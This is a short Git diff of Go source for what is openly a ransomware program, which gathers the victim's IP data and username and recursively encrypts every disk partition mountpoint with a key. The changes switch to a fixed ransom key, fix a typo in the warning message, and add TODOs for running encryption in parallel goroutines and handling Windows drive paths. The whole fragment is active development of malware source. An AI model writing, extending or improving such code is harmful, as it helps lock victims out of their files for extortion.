@@ -43,7 +43,7 @@ func main() {
 
 	var data RansomData
 	data.IPData = go_grab_ip.AwaitIPData()
-	data.Key = ransom.GenerateKey()
+	data.Key = ransom.Key
 
 	o, _ := user.Current()
 	data.Username = o.Username
@@ -59,7 +59,9 @@ func main() {
 		if ransom.Debug {
 			fmt.Println(partition.Mountpoint)
 		} else {
-			fmt.Println("WARNING: Starting to encrpy files...")
+			fmt.Println("WARNING: Starting to encrypt files...")
+			//TODO: add an anonymous function and make each mountpoint be in another goroutine
+			//TODO: check if the os is windows, if it is you need to encrypt partition.Mountpoint + "\\"
 			err := ransom.RecursivelyEncryptDirectory(partition.Mountpoint, []byte(data.Key))
 			if err != nil {
 				fmt.Println(err)
